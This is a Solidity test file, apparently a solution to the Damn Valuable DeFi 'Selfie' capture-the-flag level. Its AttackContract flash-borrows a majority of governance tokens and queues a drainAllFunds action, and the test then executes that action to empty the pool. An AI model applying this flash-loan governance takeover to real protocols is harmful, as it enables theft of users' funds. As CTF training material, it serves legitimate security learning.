// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        AttackContract attackContract = new AttackContract(selfiePool, simpleGovernance);
        attackContract.pwn();
        vm.warp(block.timestamp + 2 days);
        simpleGovernance.executeAction(attackContract.actionId());
        attackContract.withdraw();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract AttackContract {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public governanceToken;
    address public owner;
    uint256 public actionId;

    constructor(SelfiePool _selfiePool, SimpleGovernance _simpleGovernance) {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        governanceToken = simpleGovernance.governanceToken();
        owner = msg.sender;
    }

    function pwn() external {
        selfiePool.flashLoan(governanceToken.totalSupply() / 2 + 1);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        // Take snapshot
        governanceToken.snapshot();

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            data,
            0
        );
        // Pay back flashloan
        governanceToken.transfer(address(selfiePool), borrowAmount);
    }

    function withdraw() external {
        governanceToken.transfer(owner, governanceToken.balanceOf(address(this)));
    }
}
